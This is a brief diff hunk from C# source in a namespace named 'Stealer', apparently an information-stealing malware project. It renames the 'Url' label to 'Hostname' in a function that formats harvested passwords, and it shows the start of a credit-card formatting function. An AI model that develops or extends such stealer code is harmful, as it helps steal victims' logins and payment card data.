@@ -9,7 +9,7 @@ namespace Stealer
     {
         private static string FormatPassword(Password pPassword)
         {
-            return String.Format("Url: {0}\nUsername: {1}\nPassword: {2}\n\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
+            return String.Format("Hostname: {0}\nUsername: {1}\nPassword: {2}\n\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
         }
         private static string FormatCreditCard(CreditCard cCard)
         {
